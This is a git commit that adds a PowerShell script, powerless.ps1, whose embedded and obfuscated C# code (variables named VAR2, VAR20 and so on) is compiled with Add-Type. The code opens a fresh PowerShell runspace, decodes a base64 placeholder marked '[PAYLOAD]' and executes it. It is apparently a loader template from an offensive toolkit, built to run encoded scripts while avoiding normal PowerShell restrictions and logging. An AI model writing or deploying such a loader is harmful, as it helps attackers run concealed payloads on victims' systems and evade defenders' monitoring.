56d2340234c6251c72ac30506fe4308fa9b107ff
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2017-09-13 09:46:43 -0400

    Create powerless.ps1

---
+++ powershell/powerless.ps1
@@ -0,0 +1,39 @@
+$VAR21 = @"
+namespace VAR22 {
+    using System;
+    using System.IO;
+    using System.Text;
+    using System.Management.Automation;
+    using System.Collections.Generic;
+    using System.Collections.ObjectModel;
+    using System.Management.Automation.Runspaces;
+    
+    public static class VAR2 { 
+        public static bool VAR20() {
+        
+            Runspace VAR4 = RunspaceFactory.CreateRunspace();
+            VAR4.Open();
+            RunspaceInvoke VAR5 = new RunspaceInvoke(VAR4);
+            Pipeline VAR12 = VAR4.CreatePipeline();
+            
+            byte[] VAR10 = Convert.FromBase64String("[PAYLOAD]");
+            string VAR11 = Encoding.UTF8.GetString(VAR10);
+        
+            VAR12.Commands.AddScript(VAR11);
+            VAR12.Commands.Add("Out-String");
+            Collection<PSObject> VAR13 = VAR12.Invoke();
+            VAR4.Close();
+            
+            StringBuilder VAR14 = new StringBuilder();
+            foreach(PSObject VAR15 in VAR13) {
+                VAR14.AppendLine(VAR15.ToString());
+            }
+            Console.Write(VAR14.ToString());
+            return true;
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $VAR21 -Language CSharp
+[VAR22.VAR2]::VAR20()
